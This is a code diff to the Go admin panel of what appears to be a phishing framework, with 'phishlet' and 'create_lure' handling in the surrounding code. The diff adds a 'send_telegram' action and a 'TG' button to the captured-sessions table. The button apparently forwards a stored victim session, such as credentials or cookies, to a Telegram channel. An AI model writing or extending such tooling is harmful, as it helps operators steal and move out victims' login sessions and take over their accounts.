@@ -295,6 +295,14 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			http.Redirect(w, r, "/admin/panel?tab=sessions", http.StatusSeeOther)
 			return
 
+		case "send_telegram":
+			sid, _ := strconv.Atoi(r.FormValue("session_id"))
+			if sess, err := s.Db.GetSessionById(sid); err == nil {
+				NotifySessionFromDB(sess)
+			}
+			http.Redirect(w, r, "/admin/panel?tab=sessions&ok=sent+to+telegram", http.StatusSeeOther)
+			return
+
 		case "create_lure":
 			pl := strings.TrimSpace(r.FormValue("phishlet"))
 			path := strings.TrimSpace(r.FormValue("path"))
@@ -1479,6 +1487,12 @@ func sessionTable(sessions []*database.Session, showDelete bool) string {
 			time.Unix(sess.UpdateTime, 0).Format("Jan 2 15:04"),
 			detail,
 		))
+		b.WriteString(fmt.Sprintf(`<td>
+<form class="inline" method="POST" action="/admin/panel?tab=sessions">
+<input type="hidden" name="action" value="send_telegram">
+<input type="hidden" name="session_id" value="%d">
+<button type="submit" class="btn btn-xs" style="background:var(--accent);color:#fff">TG</button>
+</form></td>`, sess.Id))
 		if showDelete {
 			b.WriteString(fmt.Sprintf(`<td>
 <form class="inline" method="POST" action="/admin/panel?tab=sessions">
